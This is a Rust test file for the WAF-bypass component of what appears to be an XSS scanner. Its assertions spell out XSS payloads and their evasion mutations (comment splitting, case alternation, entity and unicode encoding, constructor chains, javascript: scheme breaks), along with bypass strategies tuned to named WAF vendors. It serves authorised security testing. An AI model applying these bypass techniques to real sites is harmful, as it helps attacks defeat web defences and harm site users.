use super::*;

#[test]
fn test_html_comment_split() {
    assert_eq!(
        html_comment_split("<script>alert(1)</script>"),
        "<scr<!---->ipt>alert(1)</script>"
    );
    assert_eq!(
        html_comment_split("<img src=x onerror=alert(1)>"),
        "<im<!---->g src=x onerror=alert(1)>"
    );
}

#[test]
fn test_whitespace_mutation() {
    assert_eq!(
        whitespace_mutation("<img src=x onerror=alert(1)>"),
        "<img\tsrc=x onerror=alert(1)>"
    );
    assert_eq!(
        whitespace_mutation("<svg onload=alert(1)>"),
        "<svg\nonload=alert(1)>"
    );
}

/// Tags that weren't in the original literal table now get mutated
/// too. Prior implementation no-op'd on these and lost a bypass
/// opportunity whenever a payload used a less-common tag.
#[test]
fn test_whitespace_mutation_covers_new_tags() {
    assert_eq!(
        whitespace_mutation("<form action=x onfocus=alert(1)>"),
        "<form\taction=x onfocus=alert(1)>"
    );
    assert_eq!(
        whitespace_mutation("<button onclick=alert(1)>"),
        "<button\tonclick=alert(1)>"
    );
}

#[test]
fn test_html_comment_split_covers_new_tags() {
    // Long tag (>=6 letters) — split after 3rd letter to mirror the
    // original 11-tag list's behavior on `<script` and `<iframe`.
    assert_eq!(
        html_comment_split("<details open>"),
        "<det<!---->ails open>"
    );
    // Short tag (<6 letters) — split after 2nd letter.
    assert_eq!(html_comment_split("<form>"), "<fo<!---->rm>");
}

#[test]
fn test_slash_separator_covers_new_tags() {
    assert_eq!(slash_separator("<form action=x>"), "<form/action=x>");
}

#[test]
fn test_exotic_whitespace_covers_new_tags() {
    let r = exotic_whitespace("<button onclick=alert(1)>");
    assert!(r.contains('\x0B') || r.contains('\x0C'));
    assert!(!r.contains("<button on"));
}

#[test]
fn test_unicode_js_escape_covers_new_keywords() {
    assert!(
        unicode_js_escape("location.href = 'evil'").starts_with("\\u006c")
            || unicode_js_escape("location.href = 'evil'").starts_with("\\u006C"),
        "location should pick up unicode escape on first letter"
    );
    assert!(
        unicode_js_escape("setTimeout(x,1)").starts_with("\\u0073")
            || unicode_js_escape("setTimeout(x,1)").starts_with("\\u0053"),
        "setTimeout should pick up unicode escape"
    );
}

#[test]
fn test_js_comment_split_covers_new_sinks() {
    // setTimeout / Function / fetch were not in the original literal
    // list — they now get mutated when present.
    assert!(js_comment_split("setTimeout(x,1)").contains("/**/"));
    assert!(js_comment_split("Function('x')()").contains("/**/"));
    assert!(js_comment_split("fetch('/x')").contains("/**/"));
}

#[test]
fn test_js_comment_split() {
    assert_eq!(js_comment_split("alert(1)"), "al/**/ert(1)");
    assert_eq!(js_comment_split("confirm(1)"), "con/**/firm(1)");
}

#[test]
fn test_backtick_parens() {
    assert_eq!(backtick_parens("alert(1)"), "alert`1`");
    assert_eq!(backtick_parens("confirm(1)"), "confirm`1`");
}

#[test]
fn test_constructor_chain() {
    assert_eq!(
        constructor_chain("alert(1)"),
        "[].constructor.constructor('alert(1)')()"
    );
}

#[test]
fn test_unicode_js_escape() {
    assert_eq!(unicode_js_escape("alert(1)"), "\\u0061lert(1)");
}

#[test]
fn test_mixed_html_entities() {
    let result = mixed_html_entities("<img src=x>");
    assert!(!result.contains('<'));
    assert!(!result.contains('>'));
    assert!(result.contains("&#60;") || result.contains("&#x3c;"));
}

#[test]
fn test_case_alternate() {
    let result = case_alternate("<script>");
    assert!(result.contains('S') || result.contains('C'));
    // Should have mixed case
    assert_ne!(result, "<script>");
    assert_ne!(result, "<SCRIPT>");
}

#[test]
fn test_case_alternate_closing_tag() {
    // Both the opening and the closing tag name must be alternated so a WAF
    // signature on `</script>` is evaded too, not just `<script>`.
    assert_eq!(
        case_alternate("<script>alert(1)</script>"),
        "<ScRiPt>alert(1)</ScRiPt>"
    );
    // A `/` that follows tag-name chars is still a separator: `<svg/onload>`
    // keeps `onload` un-alternated (only the `svg` tag name is touched).
    assert_eq!(case_alternate("<svg/onload>"), "<SvG/onload>");
}

#[test]
fn test_get_bypass_strategy_cloudflare() {
    let strategy = get_bypass_strategy(&WafType::Cloudflare);
    assert!(!strategy.extra_encoders.is_empty());
    assert!(!strategy.mutations.is_empty());
    assert!(strategy.extra_encoders.contains(&"unicode".to_string()));
}

#[test]
fn test_merge_strategies() {
    let waf_types = vec![&WafType::Cloudflare, &WafType::ModSecurity];
    let merged = merge_strategies(&waf_types);
    // Should contain encoders from both
    assert!(merged.extra_encoders.contains(&"unicode".to_string()));
    assert!(merged.extra_encoders.contains(&"4url".to_string()));
    // No duplicates
    let mut seen = std::collections::HashSet::new();
    assert!(merged.extra_encoders.iter().all(|e| seen.insert(e)));
}

#[test]
fn test_merge_strategies_empty_returns_default() {
    let merged = merge_strategies(&[]);
    assert!(merged.extra_encoders.is_empty());
    assert!(merged.mutations.is_empty());
    assert_eq!(merged.extra_delay_hint_ms, 0);
}

#[test]
fn test_merge_strategies_single_waf_matches_get_strategy() {
    let direct = get_bypass_strategy(&WafType::Cloudflare);
    let merged = merge_strategies(&[&WafType::Cloudflare]);
    assert_eq!(merged.extra_encoders, direct.extra_encoders);
    assert_eq!(merged.mutations, direct.mutations);
    assert_eq!(merged.extra_delay_hint_ms, direct.extra_delay_hint_ms);
}

#[test]
fn test_merge_strategies_takes_max_delay_hint() {
    // Cloudflare hints 100ms, AwsWaf hints 0ms — combined should be 100.
    let merged = merge_strategies(&[&WafType::AwsWaf, &WafType::Cloudflare]);
    assert_eq!(merged.extra_delay_hint_ms, 100);

    // Order shouldn't matter.
    let merged_rev = merge_strategies(&[&WafType::Cloudflare, &WafType::AwsWaf]);
    assert_eq!(merged_rev.extra_delay_hint_ms, 100);
}

#[test]
fn test_merge_strategies_dedups_mutations() {
    // Both Cloudflare and Akamai use HtmlCommentSplit + CaseAlternation +
    // BacktickParens; the merged set must list each once.
    let merged = merge_strategies(&[&WafType::Cloudflare, &WafType::Akamai]);
    let mut seen = std::collections::HashSet::new();
    assert!(merged.mutations.iter().all(|m| seen.insert(m)));
}

#[test]
fn test_merge_strategies_three_wafs_accumulates_unique_mutations() {
    // Stacking three WAFs should still produce a flat, deduped list and
    // never less coverage than any single strategy.
    let cf = get_bypass_strategy(&WafType::Cloudflare).mutations;
    let merged = merge_strategies(&[
        &WafType::Cloudflare,
        &WafType::ModSecurity,
        &WafType::OwaspCrs,
    ]);
    for m in cf {
        assert!(
            merged.mutations.contains(&m),
            "Cloudflare mutation {:?} should survive the merge",
            m
        );
    }
    let mut seen = std::collections::HashSet::new();
    assert!(merged.mutations.iter().all(|m| seen.insert(m)));
}

#[test]
fn test_merge_strategies_unknown_waf_with_known_dedups() {
    let merged = merge_strategies(&[&WafType::Unknown("hint".to_string()), &WafType::Cloudflare]);
    let mut seen = std::collections::HashSet::new();
    assert!(merged.mutations.iter().all(|m| seen.insert(m)));
    let mut seen_e = std::collections::HashSet::new();
    assert!(merged.extra_encoders.iter().all(|e| seen_e.insert(e)));
}

#[test]
fn test_apply_mutations_limit() {
    let payloads = vec!["<script>alert(1)</script>".to_string()];
    let mutations = vec![
        MutationType::HtmlCommentSplit,
        MutationType::CaseAlternation,
        MutationType::BacktickParens,
        MutationType::JsCommentSplit,
    ];
    // Limit to 2 variants per payload
    let result = apply_mutations(&payloads, &mutations, 2);
    // Original + at most 2 variants
    assert!(result.len() <= 3);
    assert_eq!(result[0], "<script>alert(1)</script>");
}

#[test]
fn test_apply_mutations_dedup() {
    let payloads = vec!["no_match_here".to_string()];
    let mutations = vec![MutationType::HtmlCommentSplit, MutationType::BacktickParens];
    let result = apply_mutations(&payloads, &mutations, 5);
    // No mutation matched, so just the original
    assert_eq!(result.len(), 1);
}

#[test]
fn test_every_waf_has_strategy() {
    let waf_types = vec![
        WafType::Cloudflare,
        WafType::AwsWaf,
        WafType::Akamai,
        WafType::Imperva,
        WafType::ModSecurity,
        WafType::OwaspCrs,
        WafType::Sucuri,
        WafType::F5BigIp,
        WafType::Barracuda,
        WafType::FortiWeb,
        WafType::AzureWaf,
        WafType::CloudArmor,
        WafType::Fastly,
        WafType::Wordfence,
        WafType::Citrix,
        WafType::Unknown("test".to_string()),
    ];
    for waf in &waf_types {
        let strategy = get_bypass_strategy(waf);
        assert!(
            !strategy.extra_encoders.is_empty(),
            "WAF {:?} has no extra encoders",
            waf
        );
        assert!(
            !strategy.mutations.is_empty(),
            "WAF {:?} has no mutations",
            waf
        );
    }
}

#[test]
fn mutation_stats_records_variants_per_type() {
    let stats = MutationStats::default();
    stats.record_variant(MutationType::HtmlCommentSplit);
    stats.record_variant(MutationType::HtmlCommentSplit);
    stats.record_variant(MutationType::JsCommentSplit);
    let snap = stats.snapshot();
    assert_eq!(
        snap.variants.get(&MutationType::HtmlCommentSplit).copied(),
        Some(2)
    );
    assert_eq!(
        snap.variants.get(&MutationType::JsCommentSplit).copied(),
        Some(1)
    );
}

#[test]
fn mutation_stats_record_request_counts_blocks() {
    let stats = MutationStats::default();
    stats.record_request(false);
    stats.record_request(false);
    stats.record_request(true);
    let snap = stats.snapshot();
    assert_eq!(snap.bypass_requests, 3);
    assert_eq!(snap.bypass_blocks, 1);
}

#[test]
fn apply_mutations_tagged_marks_origin() {
    // The base payload has no origin; each derived variant carries
    // its mutation type so callers can attribute outcomes.
    let payloads = vec!["<svg onload=alert(1)>".to_string()];
    let mutations = vec![MutationType::HtmlCommentSplit, MutationType::SlashSeparator];
    let tagged = apply_mutations_tagged(&payloads, &mutations, 5);
    let bases = tagged.iter().filter(|(_, o)| o.is_none()).count();
    assert!(bases >= 1, "original payload must be tagged with None");
    let html = tagged
        .iter()
        .filter(|(_, o)| matches!(o, Some(MutationType::HtmlCommentSplit)))
        .count();
    let slash = tagged
        .iter()
        .filter(|(_, o)| matches!(o, Some(MutationType::SlashSeparator)))
        .count();
    assert_eq!(html, 1, "html_comment_split should produce one variant");
    assert_eq!(slash, 1, "slash_separator should produce one variant");
}

#[test]
fn test_unknown_403_uses_default_strategy() {
    // Generic 403 carries no hint about which dimension to lean on;
    // bypass should fall through to the conservative mutation kit.
    let s = get_bypass_strategy(&WafType::Unknown("HTTP 403".to_string()));
    assert!(s.extra_encoders.contains(&"unicode".to_string()));
    assert!(s.mutations.contains(&MutationType::HtmlCommentSplit));
    assert_eq!(s.extra_delay_hint_ms, 0);
}

#[test]
fn test_unknown_429_emphasizes_delay() {
    // 429/503 means the edge is rate-limiting; piling on mutations just
    // keeps tripping the limiter. Strategy must lean on delay instead.
    let s = get_bypass_strategy(&WafType::Unknown("HTTP 429".to_string()));
    assert!(
        s.extra_delay_hint_ms >= 1000,
        "rate-limit blocks need a real delay hint"
    );
    assert!(s.mutations.len() <= 2, "keep mutation pressure low for 429");
}

#[test]
fn test_unknown_503_emphasizes_delay() {
    let s = get_bypass_strategy(&WafType::Unknown("HTTP 503".to_string()));
    assert!(s.extra_delay_hint_ms >= 1000);
}

#[test]
fn test_unknown_406_emphasizes_encoders() {
    // 406 is content-type/encoding-driven — mutation alone does not
    // change wire encoding, so the strategy must broaden encoders.
    let s = get_bypass_strategy(&WafType::Unknown("HTTP 406".to_string()));
    let multi_url_count = s
        .extra_encoders
        .iter()
        .filter(|e| e.ends_with("url") || e.as_str() == "url")
        .count();
    assert!(
        multi_url_count >= 2,
        "406 strategy should stack multiple url encoders, got {:?}",
        s.extra_encoders
    );
}

#[test]
fn test_unknown_arbitrary_hint_falls_through_to_default() {
    // Forced-unknown via `--force-waf custom-vendor-x` lands here. It
    // must not blow up and must get a non-empty strategy.
    let s = get_bypass_strategy(&WafType::Unknown("custom-vendor-x".to_string()));
    assert!(!s.extra_encoders.is_empty());
    assert!(!s.mutations.is_empty());
}

#[test]
fn test_owasp_crs_strategy() {
    let strategy = get_bypass_strategy(&WafType::OwaspCrs);
    // CRS strategy should include all CRS-targeting mutations
    assert!(strategy.mutations.contains(&MutationType::SlashSeparator));
    assert!(strategy.mutations.contains(&MutationType::SvgAnimateExec));
    assert!(strategy.mutations.contains(&MutationType::HtmlEntityParens));
    assert!(strategy.mutations.contains(&MutationType::ExoticWhitespace));
    // Should include unicode and multi-url encoding
    assert!(strategy.extra_encoders.contains(&"unicode".to_string()));
    assert!(strategy.extra_encoders.contains(&"4url".to_string()));
}

#[test]
fn test_slash_separator() {
    assert_eq!(
        slash_separator("<svg onload=alert(1)>"),
        "<svg/onload=alert(1)>"
    );
    assert_eq!(
        slash_separator("<img src=x onerror=alert(1)>"),
        "<img/src=x onerror=alert(1)>"
    );
}

#[test]
fn test_html_entity_parens() {
    assert_eq!(html_entity_parens("alert(1)"), "alert&#40;1&#41;");
    assert_eq!(
        html_entity_parens("<img src=x onerror=alert(1)>"),
        "<img src=x onerror=alert&#40;1&#41;>"
    );
}

#[test]
fn test_svg_animate_exec() {
    let result = svg_animate_exec("<svg onload=alert(1)>");
    assert!(result.contains("<svg><animate"));
    assert!(result.contains("onbegin=alert(1)"));
    assert!(result.contains("attributeName=x"));
}

#[test]
fn test_svg_animate_exec_from_img() {
    let result = svg_animate_exec("<img src=x onerror=alert(1)>");
    assert!(result.contains("<svg><animate"));
    assert!(result.contains("onbegin=alert(1)"));
}

#[test]
fn test_exotic_whitespace() {
    let result = exotic_whitespace("<img src=x onerror=alert(1)>");
    assert!(result.contains('\x0B') || result.contains('\x0C'));
    assert!(!result.contains("<img src"));
}

#[test]
fn test_exotic_whitespace_svg() {
    let result = exotic_whitespace("<svg onload=alert(1)>");
    assert!(result.contains('\x0B') || result.contains('\x0C'));
}

/// The literal `alert(1)` table is gone; backtick_parens now fires on any
/// sink-call argument. These shapes used to no-op and silently lose a
/// bypass variant against real payloads.
#[test]
fn test_backtick_parens_generalizes_over_arguments() {
    // Member-access argument interpolates so it still evaluates.
    assert_eq!(
        backtick_parens("<svg onload=alert(document.domain)>"),
        "<svg onload=alert`${document.domain}`>"
    );
    // Quoted string literal collapses to its inner text.
    assert_eq!(backtick_parens("alert('XSS')"), "alert`XSS`");
    // Argument-less sink call.
    assert_eq!(backtick_parens("print()"), "print``");
    // Sink embedded in an attribute, with following markup preserved.
    assert_eq!(
        backtick_parens("<img src=x onerror=confirm(1)>"),
        "<img src=x onerror=confirm`1`>"
    );
    // Regex argument interpolates rather than dropping the bypass.
    assert_eq!(backtick_parens("alert(/xss/)"), "alert`${/xss/}`");
}

/// constructor_chain now wraps arbitrary sink calls and picks a quote
/// char that keeps the wrapped string valid even when the argument is
/// itself quoted.
#[test]
fn test_constructor_chain_generalizes_over_arguments() {
    // Single-quoted argument forces the wrapper to double quotes.
    assert_eq!(
        constructor_chain("alert('XSS')"),
        "[].constructor.constructor(\"alert('XSS')\")()"
    );
    // Member access wraps cleanly in single quotes.
    assert_eq!(
        constructor_chain("alert(document.domain)"),
        "[].constructor.constructor('alert(document.domain)')()"
    );
    // Embedded in markup: only the call is rewritten.
    assert_eq!(
        constructor_chain("<img src=x onerror=prompt(1)>"),
        "<img src=x onerror=[].constructor.constructor('prompt(1)')()>"
    );
}

#[test]
fn test_find_sink_call_balances_nested_parens() {
    // The argument carries its own parens; the call must close on the
    // matching outer `)`, not the first one.
    let (start, open, close) = find_sink_call("alert(String(1))").unwrap();
    assert_eq!(start, 0);
    assert_eq!(&"alert(String(1))"[open..=close], "(String(1))");
}

#[test]
fn test_citrix_netscaler_strategy() {
    let strategy = get_bypass_strategy(&WafType::Citrix);
    assert!(!strategy.extra_encoders.is_empty());
    assert!(!strategy.mutations.is_empty());
    // Signature-driven WAF: must exercise the literal-shape-breaking
    // mutations.
    assert!(strategy.mutations.contains(&MutationType::HtmlCommentSplit));
    assert!(strategy.mutations.contains(&MutationType::CaseAlternation));
    assert!(strategy.extra_encoders.contains(&"unicode".to_string()));
}

/// Every mutation variant, used to exercise the `Display` and
/// `apply_single_mutation` dispatch arms exhaustively.
const ALL_MUTATIONS: &[MutationType] = &[
    MutationType::HtmlCommentSplit,
    MutationType::WhitespaceMutation,
    MutationType::JsCommentSplit,
    MutationType::BacktickParens,
    MutationType::ConstructorChain,
    MutationType::UnicodeJsEscape,
    MutationType::MixedHtmlEntities,
    MutationType::CaseAlternation,
    MutationType::SlashSeparator,
    MutationType::HtmlEntityParens,
    MutationType::SvgAnimateExec,
    MutationType::ExoticWhitespace,
    MutationType::KeywordEntityEncode,
    MutationType::MultiSlash,
    MutationType::SchemeBreak,
    MutationType::EntityScheme,
];

#[test]
fn display_renders_every_mutation_type() {
    // Round-trips the Display arm for each variant (no two collide).
    let mut seen = std::collections::HashSet::new();
    for m in ALL_MUTATIONS {
        let name = m.to_string();
        assert!(!name.is_empty());
        assert!(seen.insert(name), "Display names must be unique");
    }
    assert_eq!(seen.len(), ALL_MUTATIONS.len());
}

#[test]
fn apply_single_mutation_dispatches_and_transforms_every_type() {
    // Each mutation paired with a payload shaped to trigger it, so every
    // dispatch arm runs its real transform (not the no-op fallthrough). The
    // attribute-decode-layer mutations need their own shapes: MultiSlash needs
    // two separators, SchemeBreak/EntityScheme need a `javascript:` scheme in
    // an attribute, none of which the lone `<svg onload=alert(1)>` carries.
    let cases: &[(MutationType, &str)] = &[
        (MutationType::HtmlCommentSplit, "<svg onload=alert(1)>"),
        (MutationType::WhitespaceMutation, "<svg onload=alert(1)>"),
        (MutationType::JsCommentSplit, "<svg onload=alert(1)>"),
        (MutationType::BacktickParens, "<svg onload=alert(1)>"),
        (MutationType::ConstructorChain, "<svg onload=alert(1)>"),
        (MutationType::UnicodeJsEscape, "<svg onload=alert(1)>"),
        (MutationType::MixedHtmlEntities, "<svg onload=alert(1)>"),
        (MutationType::CaseAlternation, "<svg onload=alert(1)>"),
        (MutationType::SlashSeparator, "<svg onload=alert(1)>"),
        (MutationType::HtmlEntityParens, "<svg onload=alert(1)>"),
        (MutationType::SvgAnimateExec, "<svg onload=alert(1)>"),
        (MutationType::ExoticWhitespace, "<svg onload=alert(1)>"),
        (MutationType::KeywordEntityEncode, "<svg onload=alert(1)>"),
        (MutationType::MultiSlash, "<img src=x onerror=alert(1)>"),
        (MutationType::SchemeBreak, "<a href=javascript:alert(1)>"),
        (MutationType::EntityScheme, "<a href=javascript:alert(1)>"),
    ];
    for (m, payload) in cases {
        let out = apply_single_mutation(payload, m);
        assert_ne!(&out, payload, "{:?} should transform {}", m, payload);
    }
    // The case table must cover every variant exercised elsewhere.
    for m in ALL_MUTATIONS {
        assert!(
            cases.iter().any(|(cm, _)| cm == m),
            "missing transform case for {:?}",
            m
        );
    }
}

#[test]
fn apply_single_mutation_is_a_no_op_on_inert_text() {
    // No tag, no sink, no parens → every mutation returns the input
    // unchanged via its fallthrough branch.
    let payload = "just some inert text 123";
    for m in ALL_MUTATIONS {
        assert_eq!(apply_single_mutation(payload, m), payload, "{:?}", m);
    }
}

#[test]
fn mixed_html_entities_alternates_decimal_and_hex() {
    // Each successive special char flips between decimal and hex entities.
    assert_eq!(mixed_html_entities("<<>>"), "&#60;&#x3c;&#62;&#x3e;");
    assert_eq!(mixed_html_entities("\"\"''"), "&#34;&#x22;&#39;&#x27;");
}

#[test]
fn html_comment_split_handles_short_two_letter_tag() {
    // A 2-letter tag (len < 3) splits after a single character.
    assert_eq!(html_comment_split("<br x=1>"), "<b<!---->r x=1>");
}

#[test]
fn whitespace_mutation_handles_slash_separator() {
    // A `/`-separated tag/attr break maps to a tab via whitespace_alt_char.
    assert_eq!(whitespace_mutation("<svg/onload=x>"), "<svg\tonload=x>");
}

#[test]
fn constructor_chain_wraps_argument_with_both_quote_styles() {
    // The call carries both a single and double quote, forcing
    // wrap_js_string onto its escape-single-quotes branch.
    let out = constructor_chain("alert(\"a'b\")");
    assert!(out.starts_with("[].constructor.constructor('"));
    assert!(
        out.contains("\\'"),
        "inner single quote must be escaped: {out}"
    );
    assert!(out.ends_with(")()"));
}

#[test]
fn svg_animate_exec_transforms_uppercase_img_onerror() {
    // The uppercase ONERROR= prefix branch (and the `<im` short match).
    let out = svg_animate_exec("<IMG SRC=x ONERROR=alert(1)>");
    assert!(out.starts_with("<svg><animate onbegin=alert(1)"));
    assert!(out.contains("dur=1s"));
}

// ── KeywordEntityEncode (M3) ────────────────────────────────────────

#[test]
fn keyword_entity_encode_fires_in_event_handler() {
    // The sink's first letter is entity-encoded; the HTML tokenizer decodes
    // `&#97;` to `a` in the attribute value before the handler is compiled.
    assert_eq!(
        keyword_entity_encode("<img src=x onerror=alert(1)>"),
        "<img src=x onerror=&#97;lert(1)>"
    );
    assert_eq!(
        keyword_entity_encode("<svg onload=confirm(1)>"),
        "<svg onload=&#99;onfirm(1)>"
    );
}

#[test]
fn keyword_entity_encode_fires_in_javascript_url() {
    // A `javascript:` URL value is also entity-decoded before JS compilation.
    assert_eq!(
        keyword_entity_encode("<a href=javascript:alert(1)>"),
        "<a href=javascript:&#97;lert(1)>"
    );
    // Bare scheme payload (dalfox emits these for URL-sink reflection).
    assert_eq!(
        keyword_entity_encode("javascript:prompt(1)"),
        "javascript:&#112;rompt(1)"
    );
}

#[test]
fn keyword_entity_encode_noops_inside_script_rawtext() {
    // CRITICAL: <script> raw text is NOT entity-decoded — encoding here would
    // emit a non-executing SyntaxError variant, so it must no-op. The common
    // breakout shape `"><script>…` must still be recognized as raw text.
    assert_eq!(
        keyword_entity_encode("<script>alert(1)</script>"),
        "<script>alert(1)</script>"
    );
    assert_eq!(
        keyword_entity_encode("\"><script>alert(1)</script>"),
        "\"><script>alert(1)</script>"
    );
}

#[test]
fn keyword_entity_encode_noops_without_attr_context_or_sink() {
    // A sink call that is neither in a handler nor a javascript: URL must
    // no-op (no entity decode would happen there).
    assert_eq!(keyword_entity_encode("alert(1)"), "alert(1)");
    // No known sink call at all.
    assert_eq!(
        keyword_entity_encode("<svg onload=foo(1)>"),
        "<svg onload=foo(1)>"
    );
}

#[test]
fn keyword_entity_encode_noops_on_body_sink_after_closed_scheme_tag() {
    // Regression (impl review): a `javascript:` URL attribute whose tag has
    // already closed (`>`) before an unrelated body-text sink must NOT count as
    // attribute context — the `>` drops the sink into body text, where the
    // value is not entity-decoded. A bare `contains("javascript:")` would have
    // wrongly fired here and emitted a non-executing variant.
    assert_eq!(
        keyword_entity_encode("<a href=javascript:foo(1)>more text alert(1)"),
        "<a href=javascript:foo(1)>more text alert(1)"
    );
    // Also no-op for <style> raw text (references aren't decoded there either).
    assert_eq!(
        keyword_entity_encode("<style>alert(1)</style>"),
        "<style>alert(1)</style>"
    );
}

#[test]
fn keyword_entity_encode_not_fooled_by_literal_script_in_attribute() {
    // Regression: a literal `<script` substring inside another tag's quoted
    // attribute value (closed by the attribute quote) must NOT be mistaken for
    // a raw-text region, so the handler sink still gets mutated. (Found by the
    // adversarial implementation review.)
    assert_eq!(
        keyword_entity_encode("<script></script><img alt=\"<script\" onclick=\"alert(1)\">"),
        "<script></script><img alt=\"<script\" onclick=\"&#97;lert(1)\">"
    );
}

// ── MultiSlash (M4) ─────────────────────────────────────────────────

#[test]
fn multi_slash_replaces_every_top_level_separator() {
    assert_eq!(
        multi_slash("<img src=x onerror=alert(1)>"),
        "<img/src=x/onerror=alert(1)>"
    );
}

#[test]
fn multi_slash_noops_on_single_separator() {
    // One separator → identical to slash_separator's output, which the dedup
    // seen-set would drop; no-op so it never claims a variant slot.
    assert_eq!(
        multi_slash("<svg onload=alert(1)>"),
        "<svg onload=alert(1)>"
    );
}

#[test]
fn multi_slash_preserves_quoted_attribute_whitespace() {
    // Whitespace inside a quoted value must NOT become a slash.
    assert_eq!(
        multi_slash("<img src=x onerror=\"a = b\">"),
        "<img/src=x/onerror=\"a = b\">"
    );
}

#[test]
fn multi_slash_noops_without_an_opening_tag() {
    assert_eq!(multi_slash("alert(1)"), "alert(1)");
    // A closing tag is not an opening tag.
    assert_eq!(multi_slash("</div>"), "</div>");
}

#[test]
fn multi_slash_leaves_trailing_self_close_alone() {
    // The space before a trailing `/>` is not followed by an attr letter, so it
    // is not a separator → single real separator → no-op.
    assert_eq!(
        multi_slash("<svg onload=alert(1) />"),
        "<svg onload=alert(1) />"
    );
}

// ── SchemeBreak (M1) ────────────────────────────────────────────────

#[test]
fn scheme_break_splits_scheme_in_attribute() {
    assert_eq!(
        scheme_break("<a href=javascript:alert(1)>"),
        "<a href=java&#9;script:alert(1)>"
    );
    // Quoted attribute value.
    assert_eq!(
        scheme_break("<iframe src=\"javascript:alert(1)\">"),
        "<iframe src=\"java&#9;script:alert(1)\">"
    );
}

#[test]
fn scheme_break_splits_bare_scheme_payload() {
    assert_eq!(
        scheme_break("javascript:alert(1)"),
        "java&#9;script:alert(1)"
    );
    // vbscript keyword splits too.
    assert_eq!(scheme_break("vbscript:msgbox(1)"), "vbsc&#9;ript:msgbox(1)");
}

#[test]
fn scheme_break_noops_outside_executable_context() {
    // Mid-body-text scheme: no attribute decode happens, so no-op.
    assert_eq!(
        scheme_break("<div>see javascript:alert(1)</div>"),
        "<div>see javascript:alert(1)</div>"
    );
    // No scheme at all.
    assert_eq!(
        scheme_break("<img src=x onerror=alert(1)>"),
        "<img src=x onerror=alert(1)>"
    );
    // Scheme inside <script> raw text.
    assert_eq!(
        scheme_break("<script>x='javascript:alert(1)'</script>"),
        "<script>x='javascript:alert(1)'</script>"
    );
}

// ── EntityScheme (companion to M1) ──────────────────────────────────

#[test]
fn entity_scheme_encodes_leading_scheme_letter() {
    assert_eq!(
        entity_scheme("<a href=javascript:alert(1)>"),
        "<a href=&#106;avascript:alert(1)>"
    );
    assert_eq!(
        entity_scheme("javascript:alert(1)"),
        "&#106;avascript:alert(1)"
    );
    // Quoted attribute value, and the vbscript scheme (v = 118) — parity with
    // the SchemeBreak coverage.
    assert_eq!(
        entity_scheme("<iframe src=\"javascript:alert(1)\">"),
        "<iframe src=\"&#106;avascript:alert(1)\">"
    );
    assert_eq!(
        entity_scheme("vbscript:msgbox(1)"),
        "&#118;bscript:msgbox(1)"
    );
}

#[test]
fn entity_scheme_noops_outside_executable_context() {
    assert_eq!(
        entity_scheme("<div>javascript:alert(1) is text</div>"),
        "<div>javascript:alert(1) is text</div>"
    );
    assert_eq!(
        entity_scheme("<svg onload=alert(1)>"),
        "<svg onload=alert(1)>"
    );
}

// ── Strategy wiring ─────────────────────────────────────────────────

#[test]
fn keyword_entity_encode_wired_into_keyword_wafs() {
    for waf in [
        WafType::Cloudflare,
        WafType::OwaspCrs,
        WafType::ModSecurity,
        WafType::Citrix,
    ] {
        assert!(
            get_bypass_strategy(&waf)
                .mutations
                .contains(&MutationType::KeywordEntityEncode),
            "{:?} should exercise KeywordEntityEncode",
            waf
        );
    }
}

#[test]
fn scheme_and_multislash_wired_into_regex_wafs() {
    let crs = get_bypass_strategy(&WafType::OwaspCrs).mutations;
    assert!(crs.contains(&MutationType::MultiSlash));
    assert!(crs.contains(&MutationType::SchemeBreak));
    assert!(crs.contains(&MutationType::EntityScheme));
}
